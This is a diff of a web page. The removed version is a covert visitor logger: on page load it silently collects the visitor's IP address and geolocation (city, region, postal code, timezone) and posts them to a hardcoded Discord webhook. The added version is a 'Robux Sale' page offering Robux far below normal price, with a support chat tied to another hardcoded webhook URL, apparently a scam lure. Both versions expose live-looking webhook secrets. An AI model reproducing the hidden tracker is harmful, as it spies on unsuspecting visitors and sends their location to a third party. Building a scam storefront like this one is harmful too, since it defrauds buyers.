@@ -1,101 +1,202 @@
-﻿<!DOCTYPE html>
-<html lang="ru">
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Отправка информации в Discord Webhook</title>
+    <title>Robux Sale</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             margin: 0;
-            background-color: #f0f0f0;
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f5f5;
         }
 
-        .gif-container {
+        header {
+            background-color: #1c1c1c;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+            header h1 {
+                margin: 0;
+                font-size: 1.5em;
+            }
+
+            header nav a {
+                color: white;
+                text-decoration: none;
+                margin-left: 20px;
+                font-size: 1em;
+            }
+
+                header nav a:hover {
+                    text-decoration: underline;
+                }
+
+        .container {
+            padding: 20px;
+        }
+
+        .product-card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            padding: 20px;
             text-align: center;
         }
 
-            .gif-container img {
-                max-width: 100%;
-                height: auto;
+            .product-card h2 {
+                margin: 0 0 10px;
+            }
+
+            .product-card button {
+                background-color: #00aaff;
+                color: white;
+                border: none;
+                padding: 10px 15px;
+                font-size: 1em;
                 cursor: pointer;
+                border-radius: 4px;
+            }
+
+                .product-card button:hover {
+                    background-color: #008ecc;
+                }
+
+        .support {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+        }
+
+            .support textarea {
+                width: 100%;
+                padding: 10px;
+                border-radius: 4px;
+                border: 1px solid #ccc;
+                margin-bottom: 10px;
+            }
+
+            .support button {
+                background-color: #00aaff;
+                color: white;
+                border: none;
+                padding: 10px 15px;
+                font-size: 1em;
+                cursor: pointer;
+                border-radius: 4px;
+            }
+
+                .support button:hover {
+                    background-color: #008ecc;
+                }
+
+        .chat {
+            margin-top: 20px;
+            background: #e9e9e9;
+            padding: 10px;
+            border-radius: 8px;
+        }
+
+            .chat p {
+                margin: 0;
+                padding: 5px 0;
             }
     </style>
 </head>
 <body>
-    <div class="gif-container">
-        <a href="https://your-website.com" target="_blank" id="gif-link">
-            <img src="https://media.giphy.com/media/l0MYEbFG56s6wFz0Y/giphy.gif" alt="Random GIF">
-        </a>
+    <header>
+        <h1>Robux Sale</h1>
+        <nav>
+            <a href="#">Home</a>
+            <a href="#support">Support</a>
+        </nav>
+    </header>
+    <div class="container">
+        <div class="product-card">
+            <h2>100 Robux</h2>
+            <p>Price: $1.00</p>
+            <button onclick="window.location.href='https://your-buy-site.com'">Buy Now</button>
+        </div>
+        <div class="product-card">
+            <h2>500 Robux</h2>
+            <p>Price: $5.00</p>
+            <button onclick="window.location.href='https://your-buy-site.com'">Buy Now</button>
+        </div>
+        <div id="support" class="support">
+            <h2>Support</h2>
+            <textarea id="supportMessage" placeholder="Type your message here..."></textarea>
+            <button onclick="sendSupportMessage()">Send</button>
+            <div id="chat" class="chat"></div>
+        </div>
     </div>
 
     <script>
-        // Получение IP-адреса
-        async function getIP() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        }
+        let lastMessageId = null;
 
-        // Получение данных о местоположении (страна, город, адрес)
-        async function getLocation(ip) {
-            const response = await fetch(`https://ipapi.co/${ip}/json/`);
-            const data = await response.json();
-            return {
-                country: data.country_name,
-                city: data.city,
-                region: data.region,
-                region_code: data.region_code,
-                postal: data.postal,
-                address: `${data.city}, ${data.region}, ${data.country_name}`,
-                timezone: data.timezone
-            };
-        }
+        function sendSupportMessage() {
+            const message = document.getElementById('supportMessage').value;
+            if (!message) {
+                alert('Please enter a message.');
+                return;
+            }
 
-        // Получение текущего времени
-        function getCurrentTime(timezone) {
-            const date = new Date().toLocaleString("en-US", { timeZone: timezone });
-            return date;
-        }
+            const webhookURL = 'https://your-discord-webhook-url';
 
-        // Отправка данных в Discord Webhook
-        async function sendToDiscord(ip, country, city, region, postal, address, timezone, time) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1327336020831895646/bsReO3dbHVsYxDtvBxA1BvngXZMcZtvfQ0stIMOo3Xn-jGsFc0lB50o3-5kz1tEnSPWY';  // Пример прокси-сервиса
-
-            const message = {
-                content: `Новый пользователь с IP: ${ip}\nСтрана: ${country}\nГород: ${city}\nРегион: ${region}\nПочтовый индекс: ${postal}\nАдрес: ${address}\nВремя: ${time}`
-            };
-
-            // Отправка данных через прокси на Webhook
-            const response = await fetch(webhookUrl, {
+            // Send the message to the Discord webhook
+            fetch(webhookURL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(message)
-            });
-
-            if (response.ok) {
-                console.log('Информация успешно отправлена в Discord');
-            } else {
-                console.error('Ошибка при отправке данных на сервер');
-            }
+                body: JSON.stringify({
+                    content: message,
+                }),
+            })
+                .then(() => {
+                    const chat = document.getElementById('chat');
+                    const userMessage = document.createElement('p');
+                    userMessage.textContent = `You: ${message}`;
+                    chat.appendChild(userMessage);
+                    document.getElementById('supportMessage').value = '';
+                })
+                .catch((error) => {
+                    alert('Failed to send message. Please try again later.');
+                    console.error('Error:', error);
+                });
         }
 
-        // Получение всех данных и отправка их в Discord
-        getIP().then(ip => {
-            getLocation(ip).then(location => {
-                const time = getCurrentTime(location.timezone);
-                sendToDiscord(ip, location.country, location.city, location.region, location.postal, location.address, location.timezone, time);
-            }).catch(err => {
-                console.error('Ошибка при получении данных о местоположении:', err);
-            });
-        }).catch(err => {
-            console.error('Ошибка при получении IP:', err);
-        });
+        function fetchReplies() {
+            const repliesURL = 'https://discord.com/api/webhooks/1327372215234072699/LA8aiH9lH6nKefzSEBYYnbONwqMBPF63kWLJpH3V-Ddm8cwddF_adzGreBk-fBQz1Ezs'; // Replace with your API to fetch replies
+
+            fetch(repliesURL)
+                .then(response => response.json())
+                .then(data => {
+                    const chat = document.getElementById('chat');
+
+                    data.messages.forEach(message => {
+                        if (!lastMessageId || message.id > lastMessageId) {
+                            const supportReply = document.createElement('p');
+                            supportReply.textContent = `Support: ${message.content}`;
+                            chat.appendChild(supportReply);
+                            lastMessageId = message.id;
+                        }
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching replies:', error);
+                });
+        }
+
+        setInterval(fetchReplies, 5000); // Fetch replies every 5 seconds
     </script>
 </body>
 </html>
+
